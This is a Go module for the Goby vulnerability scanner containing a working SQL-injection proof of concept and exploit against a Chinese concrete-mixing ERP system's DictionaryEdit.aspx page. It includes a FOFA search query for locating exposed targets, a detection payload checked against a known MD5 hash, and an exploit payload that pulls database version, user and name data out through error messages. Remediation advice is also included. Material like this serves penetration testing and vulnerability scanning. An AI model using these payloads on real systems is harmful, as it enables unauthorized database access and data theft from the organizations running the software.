package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SQL injection exists on Lotus ERP DictionaryEdit.aspx page",
    "Description": "<p>Hangzhou Lotus Software Co., Ltd. developed the commercial ERP system. This system mainly deals with the management of the mixing station of the construction company or various projects, including the sales module, production management module, laboratory module, personnel management, etc. The company's commercial concrete ERP system/Sys/DictionaryEdit dict at aspx_ SQL error injection vulnerability exists in the key parameter, which allows attackers to obtain database permissions.</p>",
    "Product": "Commercial-Mixed-ERP-System",
    "Homepage": "http://www.85info.com/html/channel/cpjs_3.shtml",
    "DisclosureDate": "2022-12-01",
    "Author": "2935900435@qq.com",
    "FofaQuery": "title=\"商混ERP系统\"",
    "GobyQuery": "title=\"商混ERP系统\"",
    "Level": "3",
    "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server under high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, ...) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"http://www.85info.com/html/channel/lxwm_5.shtml\">http://www.85info.com/html/channel/lxwm_5.shtml</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "@@version,user,db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))--",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(255),{{{sql}}})--",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "tempdata|lastbody|regex|varchar\\s\\S\\s\\'((?:.*?|\\x0a)+)\\'",
                "output|lastbody|text|{{{tempdata}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2021-103340"
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "商混ERP系统 DictionaryEdit.aspx 页面存在SQL注入",
            "Product": "商混ERP系统",
            "Description": "<p>杭州荷花软件有限公司开发的商混ERP系统。这套系统主要是处理建筑公司或者各项工程的搅拌站管理，内部含有销售模块、生产管理模块、实验室模块、人员管理等，该公司的商品混凝土ERP系统/Sys/DictionaryEdit.aspx处dict_key参数存在SQL报错注入漏洞，攻击者可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>1、使用预编译语句，所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>2、对进入数据库的特殊字符（'\"@&amp;*;等）进行转义处理，或编码转换。</p><p>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>4、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><p>5、请关注厂商主页及时更新：<a href=\"http://www.85info.com/html/channel/lxwm_5.shtml\">http://www.85info.com/html/channel/lxwm_5.shtml</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SQL injection exists on Lotus ERP DictionaryEdit.aspx page",
            "Product": "Commercial-Mixed-ERP-System",
            "Description": "<p>Hangzhou Lotus Software Co., Ltd. developed the commercial ERP system. This system mainly deals with the management of the mixing station of the construction company or various projects, including the sales module, production management module, laboratory module, personnel management, etc. The company's commercial concrete ERP system/Sys/DictionaryEdit dict at aspx_ SQL error injection vulnerability exists in the key parameter, which allows attackers to obtain database permissions.<br></p>",
            "Recommendation": "<p>1. With precompiled statements, all query statements use the parameterized query interface provided by the database. Parameterized statements use parameters instead of embedding user input variables into SQL statements. At present, almost all database systems provide a parameterized SQL statement execution interface, which can effectively prevent SQL injection attacks.</p><p>2. Escape special characters ('\"@&amp;*;, ...) that enter the database, or perform encoding conversion.</p><p>3. Confirm that each type of data, such as numeric data, must be numeric, and the storage fields in the database must correspond to int.</p><p>4. Filter dangerous characters, for example: use regular expressions to match union, sleep, and, select, load_ File and other keywords. If they match, the operation will be terminated.</p><p>5. Please follow the manufacturer's homepage to update it: <a href=\"http://www.85info.com/html/channel/lxwm_5.shtml\">http://www.85info.com/html/channel/lxwm_5.shtml</a></p>",
            "Impact": "<p>In addition to taking advantage of SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write Trojan horses to the server under high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}